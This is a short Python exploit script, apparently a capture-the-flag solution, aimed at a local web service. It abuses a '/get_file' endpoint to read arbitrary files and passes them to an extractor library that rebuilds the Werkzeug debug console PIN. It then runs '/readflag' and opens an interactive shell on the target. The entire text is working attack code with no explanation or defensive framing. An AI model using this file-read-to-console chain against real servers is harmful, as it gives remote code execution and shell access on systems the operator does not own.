from wconsole_extractor import WConsoleExtractor
import requests

url = 'http://localhost:1337'

def leak_function(filename) -> str:
    r = requests.post(f'{url}/get_file', data={'filename': filename})
    if r.status_code == 200:
        return r.text
    else:
        return ''

extractor = WConsoleExtractor(
    target=url,
    leak_function=leak_function
)

print(f'probably public bits: {extractor.probably_public_bits}')
print(f'private bits: {extractor.private_bits}')

print(f'PIN CODE: {extractor.pin_code}')
flag = extractor.exec_cmd('/readflag')
print(f"Flag: {flag}")
extractor.shell()
